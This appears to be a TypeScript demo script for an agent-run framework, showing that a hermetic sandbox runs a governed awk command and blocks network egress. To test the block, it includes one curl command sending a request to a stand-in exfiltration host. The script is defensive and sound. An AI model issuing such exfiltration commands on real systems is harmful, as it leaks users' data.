import { hermeticBackend } from "@fusionkit/session-hermetic";
import { mockRunRequest, uploadWorkspace, withStackAndRepo } from "@fusionkit/testkit";
import type { Stack } from "@fusionkit/testkit";

import { renderReceipt } from "@fusionkit/example-utils";
import { demoBanner, detail, expectedFailure, finale, ok, step } from "@fusionkit/example-utils";

const POOL = "eng-prod";

async function run(
  stack: Stack,
  repoDir: string,
  prompt: string,
  allowHosts: string[] = []
) {
  const captured = await uploadWorkspace(stack.client, repoDir);
  const created = await stack.client.requestRun(
    mockRunRequest({
      requestedBy: { kind: "human", id: "dana@example.com" },
      agentKind: "command",
      prompt,
      pool: POOL,
      workspace: captured.manifest,
      network: { defaultDeny: true, allowHosts },
      isolation: "hermetic"
    })
  );
  await stack.runOnce();
  return stack.client.getBundle(created.runId);
}

async function main(): Promise<void> {
  demoBanner("13");

  step("boot a plane + runner with the hermetic backend registered");
  await withStackAndRepo({
    pool: POOL,
    startRunner: true,
    backends: [hermeticBackend()],
    policy: (policy) => {
      policy.agents.allow = ["command"];
      policy.network.allowHosts = ["example.com"];
    },
    files: { "README.md": "# checkout-service\n", "orders.csv": "id,total\n1,9\n2,12\n3,7\n" }
  }, async ({ stack, repo }) => {
    step("a governed command runs entirely inside the interpreter");
    const work = await run(
      stack,
      repo,
      "awk -F, 'NR>1 {s+=$2} END {print s}' orders.csv > total.txt && cat total.txt"
    );
    ok(`run ${work.receipt.runId} [${work.receipt.status}], isolation: ${work.receipt.runner.isolation}`);
    detail(renderReceipt(work));

    step("egress is interpreter-enforced: with no host allowlisted, curl does not exist");
    const exfil = await run(
      stack,
      repo,
      "curl -s https://exfil.example.com/leak || echo 'BLOCKED: no socket in a hermetic session'"
    );
    const logEvent = exfil.events.find(
      (e) => e.event.type === "artifact.created" && e.event.kind === "log"
    );
    if (logEvent && logEvent.event.type === "artifact.created") {
      const log = (await stack.client.getBlob(logEvent.event.hash)).toString("utf8");
      expectedFailure(`session output: ${log.trim().split("\n").pop() ?? ""}`);
    }

    finale(
      "hermetic isolation: stronger than process-level, no VM required — recorded honestly in the receipt"
    );
  });
}

main().catch((error: unknown) => {
  console.error(error instanceof Error ? error.stack ?? error.message : String(error));
  process.exit(1);
});
